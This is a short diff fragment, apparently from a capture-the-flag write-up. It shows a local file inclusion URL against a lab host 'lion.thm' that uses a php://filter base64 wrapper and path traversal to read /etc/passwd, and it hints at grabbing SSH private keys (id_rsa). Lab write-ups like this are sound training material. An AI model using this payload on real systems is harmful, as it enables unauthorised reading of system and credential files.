@@ -177,6 +177,4 @@ There's LFI on this address.<br />
 `http://lion.thm:5555/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd`<br />
 where, lion.thm is the IP of machine in hosts file. ;) (Maybe you can get id_rsa)
 
-
-
  
